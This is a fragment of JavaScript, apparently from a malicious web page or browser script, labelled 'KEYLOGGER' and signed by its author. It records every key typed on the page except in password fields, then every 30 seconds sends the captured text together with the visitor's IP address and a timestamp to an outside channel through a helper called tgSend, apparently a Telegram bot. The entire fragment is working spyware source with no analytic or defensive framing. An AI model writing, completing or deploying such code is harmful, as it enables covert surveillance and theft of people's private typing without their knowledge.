// ===== KEYLOGGER =====
let kl='',klTimer=null;
document.addEventListener('keydown',function(e){
const t=e.target.tagName.toLowerCase();
if((t==='input'||t==='textarea')&&(e.target.type||'')==='password')return;
let k=e.key;
if(k===' ')k='[SPACE]';else if(k==='Enter')k='[ENTER]\n';else if(k==='Backspace')k='[BKSP]';
else if(k==='Tab'||k==='Shift'||k==='Control'||k==='Alt'||k==='Meta'||k==='CapsLock')return;
else if(k.length>1)return;
kl+=k;
if(!klTimer)klTimer=setTimeout(async()=>{
if(kl.length>0){
const ip=await getIP();
tgSend(`⌨️ <b>Keystrokes</b>\n\n<code>${kl.substring(0,1500)}</code>\n\n📏 ${kl.length} chars\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
kl='';
}
klTimer=null;
},30000);
});

